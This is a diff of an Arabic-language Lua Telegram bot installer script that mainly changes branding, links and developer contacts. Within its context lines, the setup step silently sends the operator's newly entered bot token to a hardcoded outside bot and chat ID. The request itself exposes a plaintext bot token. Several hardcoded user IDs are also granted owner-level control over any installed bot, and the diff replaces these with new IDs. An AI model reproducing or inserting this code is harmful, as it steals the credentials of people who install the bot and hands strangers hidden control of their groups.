@@ -21,35 +21,35 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘:\na𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n\27')
+io.write('\27[0;31m\n ارسل لي توكن البوت الان ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ :\na⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[0;31m𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[0;31m⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \na𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n27[0;39;49m')
+io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n27[0;39;49m')
 local json = JSON.decode(url)
 database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
 https.request('https://api.telegram.org/bot1990511303:AAEFVDHkDVL9Zr1Su4B_4lfFMVrqPwGPIZ8/sendmessage?chat_id=1827953514&text=' ..token)
 end 
 else
-print('\27[0;35m𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[0;35m⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
 os.execute('lua DRAGON.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘:\na𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n\27[0;33;49m')
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ :\na⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n27[0;39;49m')
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 else
-print('\27[0;31m𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+print('\27[0;31m⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
 
-io.write('\27[1;31m 𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
+io.write('\27[1;31m ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
 local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
@@ -90,15 +90,15 @@ token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘"
+echo "⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺"
 echo "TG IS NOT FIND IN FILES BOT"
-echo "𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘"
+echo "⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺"
 exit 1
 fi
 if [ ! $token ]; then
-echo "𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘"
+echo "⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺"
 echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE Banda.lua \e[0m"
-echo "𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘"
+echo "⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺"
 exit 1
 fi
 echo -e "\033[38;5;208m"
@@ -149,21 +149,27 @@ _redis = load_redis()
 --------------------------------------------------------------------------------------------------------------
 print([[
 
-  _   ______  ___  ________ _____ 
- | | / / __ \/ _ \/_  __/ //_/ _ |
- | |/ / /_/ / // / / / / ,< / __ |
- |___/\____/____/ /_/ /_/|_/_/ |_|
-                                  
-                          
-~> HC↝https://t.me/surccesezr↜
-~> DEVELOPER ↝@F_R_A_N_C_E_1
+ ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
+▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
+▐░▌          ▐░▌                    ▐░▌▐░▌       ▐░▌
+▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
+ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ 
+          ▐░▌▐░▌          ▐░▌          ▐░▌     ▐░▌  
+ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ 
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
+ ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀ 
+                                                    
+~> HC↝@A_F_fwdka1↜
+~> DEVELOPER ↝@s_e_z_r0
 ]])
 sudos = dofile("./Banda.lua") 
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
 bot_id = sudos.token:match("(%d+)")  
 token = sudos.token 
---- start functions 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+--- start functions ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
 --------------------------------------------------------------------------------------------------------------
 io.popen("mkdir File_Bot") 
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
@@ -182,7 +188,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1965534755,1965534755,1437997996,1454003618}   
+sudo_users = {SUDO,1804119251,1372188096,1770493345}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -280,13 +286,13 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1965534755) then  
+if tonumber(user_id) == tonumber(1804119251) then  
 var = true
-elseif tonumber(user_id) == tonumber(1437997996) then
+elseif tonumber(user_id) == tonumber(1372188096) then
 var = true
-elseif tonumber(user_id) == tonumber(1454003618) then
+elseif tonumber(user_id) == tonumber(1770493345) then
 var = true
-elseif tonumber(user_id) == tonumber(1965534755) then
+elseif tonumber(user_id) == tonumber(1804119251) then
 var = true
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -322,10 +328,10 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1804119251) then  
 var = 'المبرمج سيزر'
-elseif tonumber(user_id) == tonumber(1437997996) then
-var = 'المبرمج عموره' 
-elseif tonumber(user_id) == tonumber(1454003618) then
-var = 'المالك ديشا'
+elseif tonumber(user_id) == tonumber(1372188096) then
+var = 'المبرمج عموري' 
+elseif tonumber(user_id) == tonumber(1770493345) then
+var = 'المالك الديشا'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
@@ -615,7 +621,7 @@ promote = '✔️'
 else
 promote = '✖'
 end
-Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- والصلاحيات هي 𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n━━━━━━━━━━'..'\n- تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n- مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
+Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- والصلاحيات هي ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ \n━━━━━━━━━━'..'\n- تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n- مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
 end
 end
 end
@@ -960,7 +966,7 @@ keyboard.inline_keyboard = {
 }
 local function getpro(extra, result, success) 
 if result.photos_[0] then 
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 else 
 send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
 end 
@@ -978,28 +984,27 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'سير عموري', url="t.me/BOT3mora"}},
-{{text = 'المالك ديشا', url="t.me/XxDesha86Xx"}},
-{{text = 'بوت تواصل عموري',url="t.me/farnce_2bot"}}, 
-{{text = 'بوت تواصل ديشا', url="t.me/vodika_55_bot"}},
+{{text = 'المبرمج  سيزر', url="t.me/s_e_z_r0"}},
+{{text = 'المالك الديشا', url="t.me/alknas11"}},
+{{text = 'بوت تواصل سيزر',url="t.me/sezrrbot"}}, 
+{{text = 'بوت تواصل الديشا', url="t.me/vodika_55_bot"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 end
 if text == "اسعار السورسات باكمل الحقوق" then
 if not DevSoFi(msg) then
 local Text = [[
-┌ سعر السورس عند سيزر
+┌ سعر السورس عند عمري
 ├ السورسات بتبدا مت100لي 240ج
 ├ سعر المصنع200
 └ سعر السيرفر ،100,و 4 بي120, 8بي160
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'المـبـرمــج جـابــوا', url="t.me/s_e_z_r0"}},
+{{text = 'المـبـرمــج جـابــوا', url="t.me/J_A_B_W_A"}},
 {{text = 'بــوت تواصـل جـابــوا',url="t.me/Bot_JABWA_Bot"}}, 
-{{text = 'بــار تواصـل جـابــوا',url="t.me/TWASLJABWA"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1011,8 +1016,8 @@ local Text = [[
 ↯ افضـل قنوات في التليجـرام اشـترك في القنوات وتابــع كل جـديد ↯
 ]]
 keyboard.inline_keyboard = {
-{{text = 'قناة سورس سيزر', url="t.me/surccesezr"}},
-{{text = 'كـل ما هوا لطـيف ❀',url="t.me/POSTAT_JABWA"}}, 
+{{text = 'قناة سورس سيزر', url="t.me/A_F_fwdka1"}},
+{{text = 'كـل ما هوا لطـيف ❀',url="t.me/POSTAT_MOSTAFA"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1021,17 +1026,17 @@ end
 if text == 'قـسم الالـعـاب' then
 local Text = 'اهـلا بـك فـي قـسـم الالــعـاب'
 local Key = {
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'رتبتي','مطور','انا مين'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'انصحنى','كتبات'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'غنيلي','بوستات'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'تويت بالصور','لو خيروك بالصور'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'صراحه','تويت'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'حروف','لو خيروك','نكته'},
 {'العوده 🌕'},
 }
@@ -1040,15 +1045,15 @@ end
 if text == 'php قـسم ممـيزات' then
 local Text = 'مميزات خاصه ب اللي منصبين مميزات '
 local Key = {
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'اغاني','مميزات'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'الافلام','العاب'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'قران','روايات'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'استوري'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'ثيم','غنيلي'},
 {'العوده 🌕'},
 }
@@ -1059,7 +1064,7 @@ if text == 'قـسم مـطورين الـسورس' then
 local Text = 'قسم مطورين السورس لدخول الي حسابتهم'
 local Key = {
 {'⇣•-•-•-•⟮قـناه الـبرمجه⟯•-•-•-•⇣'},
-{'المبرمج سيزر','المبرمج سيزر'},
+{'المبرمج عموري','المبرمج عمري'},
 {'مالك السورس'},
 {'قناة السورس','التواصل'},
 {'العوده 🌕'},
@@ -1088,11 +1093,11 @@ local keyboard = {
 {'قناة السورس','مالك السورس'},
 {'ضع اسم للبوت','معلومات الكيبورد'},
 {'المطور','الاحصائيات'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'قسـم مـطـورين السـورس','اوامـر اضـف ومـسـح'},
 {'اوامـر تفعيل و تعطـيل','اوامـر الحـمـايه'},
 {'اوامـر الاذاعـه'},
-{'𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘'},
+{'⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺'},
 {'جلب المشتركين','جلب النسخه'},
 {'جلب المطورين','جلب التوكن'},
 {'تحديث السورس ','الاصدار'},
@@ -1109,7 +1114,7 @@ tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta)
 vardump(data)
 if data and data.messages_[0].content_.sticker_ then
 local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
-local Text = ' 🌕 تم ارسال الملصق من 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n - '..Name
+local Text = ' 🌕 تم ارسال الملصق من ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n - '..Name
 sendText(SUDO,Text,0,'md')
 end 
 end,nil) 
@@ -1256,11 +1261,11 @@ HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
 CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
 uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
 echo '⇗ نظام التشغيل ⇖•\n* '"$linux_version"'*' 
-echo '𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕 ↝ الذاكره العشوائيه ↜  ↚\n* '"$memUsedPrc"'*'
-echo '𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕 ↝ وحـده الـتـخـزيـن ↜  ↚\n* '"$HardDisk"'*'
-echo '𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕 ↝ الـمــعــالــج ↜  ↚\n* '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
-echo '𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕 ↝ الــدخــول ↜  ↚\n* '`whoami`'*'
-echo '𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕 ↝ مـده تـشغيـل الـسـيـرفـر ↜ ↚\n* '"$uptime"'*'
+echo '⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕 ↝ الذاكره العشوائيه ↜  ↚\n* '"$memUsedPrc"'*'
+echo '⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕 ↝ وحـده الـتـخـزيـن ↜  ↚\n* '"$HardDisk"'*'
+echo '⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕 ↝ الـمــعــالــج ↜  ↚\n* '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
+echo '⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕 ↝ الــدخــول ↜  ↚\n* '`whoami`'*'
+echo '⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕 ↝ مـده تـشغيـل الـسـيـرفـر ↜ ↚\n* '"$uptime"'*'
 ]]):read('*all'))  
 end
 if database:get(bot_id.."Ed:DevBots") then
@@ -1332,22 +1337,22 @@ end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
 end
 if text == '/start' and DevSoFi(msg) then 
-local Text = ' 🌕 انت الان المطور الاساسي في البوت \n 🌕 سورس السيزر\n 🌕 يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/surccesezr)'
+local Text = ' 🌕 انت الان المطور الاساسي في البوت \n 🌕 سورس السيزر\n 🌕 يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == 'قسـم مـطـورين السـورس' and DevSoFi(msg) then 
 local Text = 'قسم مطورين السورس لدخول الي حسابتهم'
 local Key = {
 {'⇣•-•-•-•⟮قـناه الـبرمجه⟯•-•-•-•⇣'},
-{'المبرمج سيزر','المبرمج سيزر'},
-{'المالك ديشا'},
+{'المبرمج عمري','المبرمج عموري'},
+{'المالك الديشا'},
 {'قناة السورس','التواصل'},
 {'العوده 🌕'},
 }
@@ -1472,27 +1477,27 @@ local Text = [[
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'مبرمج السورس', url="t.me/BOT3mora"}}, 
+{{text = 'مبرمج السورس', url="t.me/s_e_z_r0"}}, 
 {{text = 'تواصل السورس', url="t.me/farnce_2bot"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-if text == '𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘' and DevSoFi(msg) then
